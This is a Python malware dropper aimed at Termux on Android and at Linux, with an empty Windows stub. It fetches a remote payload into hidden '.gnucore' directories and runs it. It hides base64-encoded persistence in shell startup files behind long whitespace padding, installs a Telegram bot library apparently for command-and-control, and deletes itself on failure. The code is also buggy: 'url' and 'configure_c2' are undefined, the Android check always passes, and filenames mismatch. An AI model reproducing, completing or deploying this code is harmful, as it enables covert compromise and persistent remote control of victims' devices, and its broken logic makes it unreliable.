from urllib.request import urlopen
from io import BytesIO
from pathlib import Path
import platform
import base64
import os
import sys
import subprocess


def suicide():
    try:
        script_dir = Path(__file__).resolve()
        script_dir.unlink()
    except Exception:
        pass
        sys.exit(1)

def android_dropper():
    print("android dropper")
    home = Path.home()
    lib = Path("/data/data/com.termux/files/usr/lib")
    payload_path = lib / ".gnucore"
    payload_path.mkdir(parents=True, exist_ok=True)

    bashrc = home / ".bashrc"
    zshrc = home / ".zshrc"
    subprocess.run([sys.executable,"-m","pip","install","python-telegram-bot"],
    stdout=subprocess.DEVNULL,
    check=True)
    if bashrc.is_file():
        plain_text_payload_persistence = f"python {payload_path}/startup & > /dev/null"
        payload_persistence_b64 = base64.b64encode(plain_text_payload_persistence.encode()).decode()
        payload_persistence = f'echo {payload_persistence_b64} | base64 -d | bash'
        with bashrc.open("a", encoding="utf-8") as f:
            ultra_space = "  " * 1000000
            f.write(f"{ultra_space} payload_persistence")
    elif zshrc.is_file():
        plain_text_payload_persistence = f"python {payload_path}/startup & > /dev/null\n"
        payload_persistence_b64 = base64.b64encode(plain_text_payload_persistence.encode()).decode()
        payload_persistence = f'echo {payload_persistence_b64} | base64 -d | bash'
        with zshrc.open("a", encoding="utf-8") as f:
            f.write(" " * 1000)
            f.write(payload_persistence)
    else:
        suicide()
    try:
        with urlopen(url, timeout=30) as response:
            file =  payload_path / "startup"
            file.write_bytes(response.read())
    except Exception as e:
        suicide()

def linux_dropper():
    home = Path.home()
    payload_path = home / ".local" / ".gnucore"
    payload_path.mkdir(parents=True, exist_ok=True)
    try:
        with urlopen(url, timeout=30) as response:
            data = response.read()
            file =  payload_path / "utils.py"
            file.write_bytes(data)
        os.chmod(payload_path / "startup", 0o755)
        subprocess.Popen(["python3", str(payload_path / "startup")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        suicide()

def windows_dropper():
    pass

def main():
    try:
        system = platform.system()


        if "Android":
            android_dropper()
        elif system == "Linux":
            configure_c2("Linux")
            linux_dropper()
        elif system == "Windows":
            configure_c2("Windows")
            windows_dropper()

        else:
            suicide()
    except Exception as e:
        suicide()

if __name__ == "__main__":
    main()
